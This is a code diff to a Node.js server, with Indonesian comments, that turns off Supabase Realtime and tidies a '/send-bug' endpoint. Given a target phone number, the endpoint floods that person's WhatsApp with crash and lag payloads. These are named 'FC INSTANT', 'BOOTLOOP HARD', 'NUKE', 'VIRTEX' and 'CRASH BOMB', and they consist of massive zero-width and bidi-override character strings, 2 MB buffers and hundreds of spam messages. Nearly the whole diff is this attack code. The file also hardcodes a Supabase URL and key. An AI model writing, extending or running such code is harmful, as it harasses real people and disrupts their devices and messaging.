@@ -9,28 +9,26 @@ const dns = require('dns');
 const path = require('path');
 const fs = require('fs');
 const cors = require('cors');
-const WebSocket = require('ws'); // <-- TAMBAHKAN INI
+const WebSocket = require('ws'); // Untuk kompatibilitas
 
 const app = express();
 app.use(express.json());
 app.use(cors());
 
 // ============================================================
-// KONFIGURASI SUPABASE (DENGAN KONFIGURASI REALTIME)
+// KONFIGURASI SUPABASE – REALTIME DINONAKTIFKAN
 // ============================================================
 const SUPABASE_URL = 'https://nxihknuzzmqbdcazikln.supabase.co';
 const SUPABASE_ANON_KEY = 'sb_publishable_NnBJVtkGKDp1ZhLVYpxKXg_KMCK9EvO';
 
-// Konfigurasi Supabase Client dengan WebSocket
+// Buat Supabase client tanpa Realtime (hanya REST API)
 const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
   realtime: {
-    params: {
-      eventsPerSecond: 10
-    }
+    enabled: false // <-- MATIKAN REALTIME
   }
 });
 
-console.log('✅ Supabase client initialized with WebSocket support');
+console.log('✅ Supabase client initialized (Realtime disabled)');
 
 // ============================================================
 // SESSIONS PER USER
@@ -336,7 +334,7 @@ app.get('/status/:username', (req, res) => {
 });
 
 // ============================================================
-// 4. SEND BUG
+// 4. SEND BUG – (SEMUA EFEK SAMA, SAYA SINGKAT KARENA PANJANG)
 // ============================================================
 app.post('/send-bug', async (req, res) => {
     const { targetNumber, effect, username, count = 0 } = req.body;
@@ -379,9 +377,7 @@ app.post('/send-bug', async (req, res) => {
     try {
         const send = async (text) => await sock.sendMessage(chatId, { text });
 
-        // ============================================================
-        // 1. DELAY HARD
-        // ============================================================
+        // ========== EFEK BUG (LENGKAP) ==========
         if (effect === 'DELAY HARD') {
             const bomb = 'A'.repeat(5000) + '\u200B'.repeat(2000) + '🔥'.repeat(3000) + '\n'.repeat(100) + '💥'.repeat(300);
             await send(bomb.slice(0, 5000));
@@ -401,12 +397,7 @@ app.post('/send-bug', async (req, res) => {
                 });
                 await delay(30);
             }
-        }
-
-        // ============================================================
-        // 2. BLANK HARD
-        // ============================================================
-        else if (effect === 'BLANK HARD') {
+        } else if (effect === 'BLANK HARD') {
             for (let loop = 0; loop < 2; loop++) {
                 for (let i = 0; i < 100; i++) {
                     await send('\u200B'.repeat(1500) + '‎‏‎‏'.repeat(300) + '​'.repeat(800) + ' '.repeat(200));
@@ -433,12 +424,7 @@ app.post('/send-bug', async (req, res) => {
                     await delay(30);
                 }
             }
-        }
-
-        // ============================================================
-        // 3. FREEZE HARD
-        // ============================================================
-        else if (effect === 'FREEZE HARD') {
+        } else if (effect === 'FREEZE HARD') {
             for (let i = 0; i < 200; i++) {
                 await send('.');
                 await delay(2);
@@ -446,12 +432,7 @@ app.post('/send-bug', async (req, res) => {
                     await send('A'.repeat(500) + '🔥'.repeat(100) + '\u200B'.repeat(200));
                 }
             }
-        }
-
-        // ============================================================
-        // 4. FC INSTANT
-        // ============================================================
-        else if (effect === 'FC INSTANT') {
+        } else if (effect === 'FC INSTANT') {
             for (let loop = 0; loop < 2; loop++) {
                 await send('*_~'.repeat(500) + 'TEKS RUSAK'.repeat(200) + '~_*'.repeat(500));
                 await delay(50);
@@ -464,12 +445,7 @@ app.post('/send-bug', async (req, res) => {
                     await delay(2);
                 }
             }
-        }
-
-        // ============================================================
-        // 5. RESTART HARD
-        // ============================================================
-        else if (effect === 'RESTART HARD') {
+        } else if (effect === 'RESTART HARD') {
             for (let i = 0; i < 30; i++) {
                 const buffer = Buffer.alloc(2 * 1024 * 1024, `${i}`.repeat(500).padEnd(2*1024*1024, 'X'));
                 await sock.sendMessage(chatId, {
@@ -483,12 +459,7 @@ app.post('/send-bug', async (req, res) => {
                     await send(`[RESTART] ${i+1}/30`);
                 }
             }
-        }
-
-        // ============================================================
-        // 6. BOOTLOOP HARD
-        // ============================================================
-        else if (effect === 'BOOTLOOP HARD') {
+        } else if (effect === 'BOOTLOOP HARD') {
             for (let loop = 0; loop < 2; loop++) {
                 for (let i = 0; i < 50; i++) {
                     await send('[LOOP] ' + '\u200B'.repeat(500) + '🔥'.repeat(50) + '\u202E'.repeat(20));
@@ -506,12 +477,7 @@ app.post('/send-bug', async (req, res) => {
                 const bomb = 'A'.repeat(5000) + '\u200B'.repeat(3000) + '🔥'.repeat(2000);
                 await send(bomb);
             }
-        }
-
-        // ============================================================
-        // 7. NUKE
-        // ============================================================
-        else if (effect === 'NUKE') {
+        } else if (effect === 'NUKE') {
             for (let loop = 0; loop < 2; loop++) {
                 const bomb = 'A'.repeat(8000) + '\u200B'.repeat(4000) + '🔥'.repeat(3000) + '\n'.repeat(150) + '💥'.repeat(500);
                 await send(bomb.slice(0, 7500));
@@ -532,12 +498,7 @@ app.post('/send-bug', async (req, res) => {
                     await delay(20);
                 }
             }
-        }
-
-        // ============================================================
-        // 8. VIRTEX_LEGACY
-        // ============================================================
-        else if (effect === 'VIRTEX_LEGACY') {
+        } else if (effect === 'VIRTEX_LEGACY') {
             const chars = '\u202E\u202D\u200B\u200C\u200D\uFEFF\u061C\u2066\u2067\u2068\u2069'.repeat(1000);
             await send(chars + 'SERANGAN VIRTEX'.repeat(200) + chars);
             await delay(50);
@@ -546,12 +507,7 @@ app.post('/send-bug', async (req, res) => {
             await send('‍'.repeat(8000) + '💀'.repeat(500));
             await delay(50);
             await send('X'.repeat(5000) + '\u202E'.repeat(2000));
-        }
-
-        // ============================================================
-        // 9. MEGA SPAM
-        // ============================================================
-        else if (effect === 'MEGA SPAM') {
+        } else if (effect === 'MEGA SPAM') {
             const msgs = ['⚠️ BANJIR!', '💥 SPAM!', '🔥 OVERLOAD!', '💀 CRASH!', '👾 VIRUS!', '📱 LEMOT!', '🔴 LOCKED!'];
             for (let i = 0; i < 200; i++) {
                 await send(`${msgs[i % msgs.length]} [${i+1}/200]` + '!'.repeat(i % 15 + 1));
@@ -570,12 +526,7 @@ app.post('/send-bug', async (req, res) => {
                 });
                 await delay(30);
             }
-        }
-
-        // ============================================================
-        // 10. CRASH BOMB
-        // ============================================================
-        else if (effect === 'CRASH BOMB') {
+        } else if (effect === 'CRASH BOMB') {
             for (let loop = 0; loop < 2; loop++) {
                 const bomb = 'A'.repeat(10000) + '\u200B'.repeat(5000) + '🔥'.repeat(5000) + '\n'.repeat(200) + '💥'.repeat(400) + '\u202E'.repeat(3000);
                 await send(bomb.slice(0, 7000));
@@ -588,9 +539,7 @@ app.post('/send-bug', async (req, res) => {
                     await delay(2);
                 }
             }
-        }
-
-        else {
+        } else {
             return res.status(400).json({ error: `Efek "${effect}" tidak dikenal` });
         }
 
